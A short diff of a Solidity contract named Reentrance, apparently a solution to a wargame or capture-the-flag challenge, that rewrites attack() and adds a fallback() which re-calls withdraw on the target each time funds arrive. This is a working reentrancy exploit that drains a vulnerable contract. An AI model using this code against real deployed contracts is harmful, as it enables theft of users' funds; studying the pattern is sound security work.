@@ -20,7 +20,11 @@ contract Reentrance {
   function attack() external payable {
     targetContract.donate{value: msg.value}(exitAddress);
     //targetContract.withdraw(address(targetContract).balance); 
-    targetContract.withdraw(msg.value); 
+    targetContract.withdraw(targetContract.balanceOf(exitAddress)); 
+  }
+
+  fallback() external payable {
+    targetContract.withdraw(targetContract.balanceOf(exitAddress)); 
   }
 
 }
